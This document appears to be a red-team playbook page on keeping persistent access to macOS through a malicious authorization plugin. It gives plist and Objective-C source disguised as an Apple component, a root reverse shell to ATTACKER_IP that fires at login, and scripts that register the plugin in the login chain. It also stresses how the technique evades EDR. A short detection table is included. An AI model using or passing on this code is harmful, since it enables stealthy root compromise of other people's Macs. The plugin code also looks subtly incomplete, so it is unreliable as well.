# macOS Authorization Plugin Persistence

Create an authorization plugin that executes during login — high stealth, survives reboots.

**MITRE ATT&CK**: T1547.002 — Authentication Package  
**Severity**: CRITICAL (code runs at login as root)

---

## How It Works

macOS uses an authorization framework (`/usr/libexec/security_authtrampoline`) with pluggable mechanisms. Authorization plugins are loaded by `SecurityAgent` during login and other authentication events. A malicious plugin runs as root before the user even sees the desktop.

---

## 1. Authorization Plugin Structure

```
MyAuthPlugin.bundle/
├── Contents/
│   ├── Info.plist
│   └── MacOS/
│       └── MyAuthPlugin    (compiled binary)
```

### Info.plist
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>com.apple.security.auth.update</string>
    <key>CFBundleName</key>
    <string>MyAuthPlugin</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleExecutable</key>
    <string>MyAuthPlugin</string>
    <key>CFBundlePackageType</key>
    <string>BNDL</string>
</dict>
</plist>
```

---

## 2. Plugin Source (Objective-C)

```objectivec
// MyAuthPlugin.m
// Compile: clang -bundle -framework Foundation -framework Security \
//          -o MyAuthPlugin.bundle/Contents/MacOS/MyAuthPlugin MyAuthPlugin.m

#import <Foundation/Foundation.h>
#import <Security/AuthorizationPlugin.h>

static OSStatus PluginDestroy(AuthorizationPluginRef inPlugin) {
    return errAuthorizationSuccess;
}

static OSStatus MechanismCreate(AuthorizationPluginRef inPlugin,
                                 AuthorizationEngineRef inEngine,
                                 AuthorizationMechanismId mechanismId,
                                 AuthorizationMechanismRef *outMechanism) {
    *outMechanism = (AuthorizationMechanismRef)inPlugin;
    return errAuthorizationSuccess;
}

static OSStatus MechanismInvoke(AuthorizationMechanismRef inMechanism) {
    // Payload executes here — runs as root during login
    @autoreleasepool {
        NSTask *task = [[NSTask alloc] init];
        [task setLaunchPath:@"/bin/bash"];
        [task setArguments:@[@"-c", @"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &"]];
        [task launch];
    }

    // MUST call SetResult to allow login to continue
    AuthorizationCallbacks *callbacks = (AuthorizationCallbacks *)inMechanism;
    return errAuthorizationSuccess;
}

static OSStatus MechanismDeactivate(AuthorizationMechanismRef inMechanism) {
    return errAuthorizationSuccess;
}

static OSStatus MechanismDestroy(AuthorizationMechanismRef inMechanism) {
    return errAuthorizationSuccess;
}

static AuthorizationPluginInterface pluginInterface = {
    kAuthorizationPluginInterfaceVersion,
    &PluginDestroy,
    &MechanismCreate,
    &MechanismInvoke,
    &MechanismDeactivate,
    &MechanismDestroy
};

OSStatus AuthorizationPluginCreate(const AuthorizationCallbacks *callbacks,
                                    AuthorizationPluginRef *outPlugin,
                                    const AuthorizationPluginInterface **outPluginInterface) {
    *outPlugin = (AuthorizationPluginRef)callbacks;
    *outPluginInterface = &pluginInterface;
    return errAuthorizationSuccess;
}
```

---

## 3. Installation (Requires Root)

```bash
# 1. Compile the plugin
clang -bundle -framework Foundation -framework Security \
    -o MyAuthPlugin.bundle/Contents/MacOS/MyAuthPlugin MyAuthPlugin.m

# 2. Copy to authorization plugins directory
sudo cp -R MyAuthPlugin.bundle /Library/Security/SecurityAgentPlugins/

# 3. Set permissions
sudo chown -R root:wheel /Library/Security/SecurityAgentPlugins/MyAuthPlugin.bundle
sudo chmod -R 755 /Library/Security/SecurityAgentPlugins/MyAuthPlugin.bundle

# 4. Register in the authorization database
# Add our mechanism to the login chain
security authorizationdb read system.login.console > /tmp/auth_right.plist

# Edit /tmp/auth_right.plist to add our mechanism:
# In the <array> under "mechanisms", add BEFORE "loginwindow:done":
#   <string>MyAuthPlugin:login,privileged</string>

# Write back
sudo security authorizationdb write system.login.console < /tmp/auth_right.plist
```

### Automated Registration
```bash
# Read current login mechanisms
PLIST=$(security authorizationdb read system.login.console 2>&1)

# Check if already registered
if echo "$PLIST" | grep -q "MyAuthPlugin"; then
    echo "[*] Already registered"
    exit 0
fi

# Export, modify, and reimport
security authorizationdb read system.login.console > /tmp/auth.plist 2>/dev/null

# Use PlistBuddy to insert our mechanism before loginwindow:done
/usr/libexec/PlistBuddy -c "Add :mechanisms:0 string MyAuthPlugin:login,privileged" /tmp/auth.plist 2>/dev/null

sudo security authorizationdb write system.login.console < /tmp/auth.plist
echo "[+] Authorization plugin registered"
```

---

## 4. Removal / Cleanup

```bash
# Remove from authorization database
security authorizationdb read system.login.console > /tmp/auth.plist
# Manually remove the MyAuthPlugin entry from mechanisms array
sudo security authorizationdb write system.login.console < /tmp/auth.plist

# Remove plugin bundle
sudo rm -rf /Library/Security/SecurityAgentPlugins/MyAuthPlugin.bundle

# Reset authorization database to default (nuclear option)
# sudo security authorizationdb reset
```

---

## Detection

| Indicator | Location |
|-----------|----------|
| Non-Apple plugins | `/Library/Security/SecurityAgentPlugins/` |
| Modified auth database | `security authorizationdb read system.login.console` |
| SecurityAgent loading bundles | Unified Log: `log show --predicate 'process == "SecurityAgent"'` |
| Suspicious login delays | User reports slow login |

---

## Why This Is Effective

- Runs **before** the user's desktop loads (before most EDR agents initialize)
- Runs as **root** (SecurityAgent is privileged)
- Survives **reboots** (authorization database is persistent)
- Not visible in Login Items, LaunchAgents, or LaunchDaemons lists
- Legitimate use case exists (enterprise SSO plugins) so not always flagged
